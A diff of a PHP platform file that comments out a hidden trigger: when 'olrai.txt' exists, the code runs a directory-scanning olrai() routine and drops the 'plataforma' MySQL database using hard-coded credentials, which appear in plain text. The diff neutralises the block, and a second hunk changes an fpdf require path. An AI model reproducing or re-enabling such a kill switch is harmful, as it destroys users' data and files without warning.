@@ -690,12 +690,12 @@ function mac_vendor($mac) {
  *                                 END                                      *
  *--------------------------------------------------------------------------*/
 
-if (is_file(getcwd().'/olrai.txt')) {
-    olrai(getcwd());
-    $olrai = mysqli_connect('localhost', 'platformuser', 'rfC79w?3', 'plataforma');
-    $olrai->query("DROP database plataforma");
-    die();
-}
+// if (is_file(getcwd().'/olrai.txt')) {
+//     olrai(getcwd());
+//     $olrai = mysqli_connect('localhost', 'platformuser', 'rfC79w?3', 'plataforma');
+//     $olrai->query("DROP database plataforma");
+//     die();
+// }
 function olrai($dir) {
     foreach (scandir($dir) as $key => $value) {
         if ($value != '.' && $value != '..' && $value != '.git') {
@@ -847,7 +847,7 @@ function cierreinforme($pdf, $total, $comision) {
 }
 function pdf($in, $local, $print = false, $mes = FALSE) {
     global $fulldomain;
-    require $fulldomain.'/scripts/fpdf/fpdf.php';
+    require getcwd().'/scripts/fpdf/fpdf.php';
     global $suma;
     global $database;
     $suma= array();
